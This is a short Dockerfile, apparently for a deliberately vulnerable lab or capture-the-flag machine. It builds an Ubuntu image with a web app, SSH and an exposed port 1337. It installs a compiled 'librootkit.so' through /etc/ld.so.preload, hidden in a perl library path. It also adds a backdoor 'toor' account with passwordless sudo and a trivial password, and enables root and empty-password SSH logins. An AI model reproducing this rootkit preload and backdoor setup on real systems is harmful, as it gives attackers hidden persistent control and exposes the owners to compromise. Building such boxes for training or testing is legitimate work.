from ubuntu 
run apt update -y; apt upgrade -y; apt clean -y
run apt install -y python3-pip iproute2 git build-essential libssl-dev libgdbm-dev libdb-dev libexpat-dev libncurses5-dev libbz2-dev zlib1g-dev gawk bison curl wget htop nodejs ruby-full openssh-server 

run echo "/usr/lib/x86_64-linux-gnu/perl/5.38.2/librootkit.so" > /etc/ld.so.preload
copy ./target/release/librootkit.so /usr/lib/x86_64-linux-gnu/perl/5.38.2/

run apt install -y sudo doas
run mkdir -p /var/www cd /var/www/; rm html -rf; git clone --depth 1 https://github.com/chrisdev22/ACME.git /var/www/html

RUN useradd -m toor 
RUN usermod -aG sudo toor
RUN echo "toor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
RUN echo "toor:a" | chpasswd

RUN mkdir /var/run/sshd
RUN ssh-keygen -A
RUN echo "PermitEmptyPasswords yes" > /root/.ssh/sshd_config
RUN echo "PermitRootLogin yes" > /root/.ssh/sshd_config

COPY entrypoint.sh /
run chmod +x entrypoint.sh
EXPOSE 80 1337 22
cmd /entrypoint.sh
